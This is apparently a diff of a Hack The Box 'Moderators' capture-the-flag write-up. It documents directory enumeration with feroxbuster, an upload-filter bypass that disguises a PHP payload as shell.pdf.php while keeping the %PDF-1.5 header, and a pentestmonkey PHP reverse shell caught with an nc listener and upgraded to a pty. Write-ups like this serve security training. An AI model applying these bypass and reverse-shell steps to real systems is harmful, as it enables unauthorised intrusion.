@@ -83,6 +83,8 @@ Scanning: http://10.129.99.138/logs/uploads
 [+] LOGS : logs/e21cece511f43a5cb18d4932429915ed/
 ```
 
+Running feroxbuster reveals that the there is a logs.pdf in the directory.
+
 ```
 └─$ feroxbuster -u http://10.129.99.138/logs/e21cece511f43a5cb18d4932429915ed -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt -x php,html,txt,git,pdf -q
 301      GET        9l       28w      346c http://10.129.99.138/logs/e21cece511f43a5cb18d4932429915ed => http://10.129.99.138/logs/e21cece511f43a5cb18d4932429915ed/
@@ -93,15 +95,22 @@ Scanning: http://10.129.99.138/logs/uploads
 Scanning: http://10.129.99.138/logs/e21cece511f43a5cb18d4932429915ed
 ```
 
+In fact each of these report numbers are actually the the directory hashes. If you run feroxbuster on all of these it will show that each of them have logs.pdf files.
+
+```
 e21cece511f43a5cb18d4932429915ed=9798
 743c41a921516b04afde48bb48e28ce6=2589
 b071cfa81605a94ad80cfa2bbc747448=3478
 b071cfa81605a94ad80cfa2bbc747448=4221
 ce5d75028d92047a9ec617acb9c34ce6=7612
 afecc60f82be41c1b52f6705ec69e0f1=8121
+```
+
+So by navigating to this pdf file it will give us some output and reveal a webpage that allows us to upload pdf files.
 
 http://moderators.htb/logs/743c41a921516b04afde48bb48e28ce6/logs.pdf
 
+```
 Logs
 [01/30/2021] Log file created for report #2589.
 [01/30/2021] Report submitted by Sharaf Ahamed.
@@ -110,7 +119,7 @@ Logs
 [02/04/2021] Reported to the site administrators.
 [02/05/2021] Posting approval sent to the owners.
 [02/07/2021] Approval pending......
-
+```
 
 
 
@@ -119,6 +128,9 @@ Logs
 Wget one of the logs.pdf files and upload it from the page.
 
 Then capture in burpsuite and edit out the pdf content with our own payload.
+
+Note: Be sure to change the pdf file type to something like shell.pdf.php and to leave the %PDF-1.5 to bypass the filter.
+Note2: Also be sure to rename the file if you fail since the files do not get overwritten or deleted.
 
 
 
@@ -130,3 +142,28 @@ Then capture in burpsuite and edit out the pdf content with our own payload.
 phpinfo();
 
 ![image](https://user-images.githubusercontent.com/105310322/194648168-1e62ad99-1e4f-4fe7-993b-7bdf3a2a6a34.png)
+
+
+
+Using pentestmonkeys reverse php shell I was able to get in.
+
+https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php
+
+```console
+└─$ nc -lvnp 1234
+listening on [any] 1234 ...
+connect to [10.10.16.19] from (UNKNOWN) [10.129.99.138] 38316
+Linux moderators 5.4.0-122-generic #138-Ubuntu SMP Wed Jun 22 15:00:31 UTC 2022 x86_64 x86_64 x86_64 GNU/Linux
+ 20:43:51 up  4:16,  0 users,  load average: 0.00, 0.00, 0.00
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+/bin/sh: 0: can't access tty; job control turned off
+$ id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+$ 
+```
+
+```console
+$ python3 -c 'import pty; pty.spawn("/bin/bash")'
+www-data@moderators:/tmp$ 
+```
